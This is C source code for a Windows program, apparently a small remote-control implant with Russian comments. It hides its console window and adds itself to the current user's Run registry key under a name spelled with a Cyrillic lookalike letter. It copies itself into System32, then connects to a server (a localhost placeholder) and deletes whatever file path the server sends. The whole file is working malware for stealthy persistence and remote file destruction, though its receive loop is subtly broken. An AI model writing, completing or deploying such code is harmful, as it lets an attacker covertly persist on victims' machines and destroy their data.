#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <conio.h>
#include <sys/types.h>
#include <stdio.h>		
#include <tchar.h>
#include <string.h>
#include <stdlib.h>   // Needed for _wtoi

// Need to link with Ws2_32.lib
#pragma comment(lib, "ws2_32.lib")

SOCKET Socket;
WSADATA Winsock;
sockaddr_in Addr;
int Addrlen = sizeof(Addr);
char resp[1001];

int main()
{     FreeConsole();

HKEY hKeys;
LPCTSTR lpszData = TEXT("client.exe");
if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeys, NULL)) {
	RegSetValueEx(hKeys, TEXT("сlient"), 0, REG_SZ, (LPBYTE)lpszData, (_tcslen(lpszData) + 1) * sizeof(TCHAR));
	RegCloseKey(hKeys);
}
CopyFile(L"D:\\сlient.exe", L"C:\\Windows\\System32\\client.exe", 1);


	WSAStartup(MAKEWORD(2, 2), &Winsock); // Start Winsock 

	if (LOBYTE(Winsock.wVersion) != 2 || HIBYTE(Winsock.wVersion) != 2) // Check version 
	{
		WSACleanup();
		return 0;
	}

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	ZeroMemory(&Addr, sizeof(Addr)); // clear the struct 
	Addr.sin_family = AF_INET; // протокол ipv4 
	char ss[100] = "127.0.0.1";
	Addr.sin_addr.s_addr = inet_addr(ss); //ip-адрес сервера
	Addr.sin_port = htons(80); // порт сервера
	while(connect(Socket, (sockaddr*)&Addr, sizeof(Addr)) >= 0)
		recv(Socket, resp, 1000, 0);
		remove(resp);

	closesocket(Socket); // после работы закрыть сокет 
	WSACleanup();
	//_getch();
	return 0;
}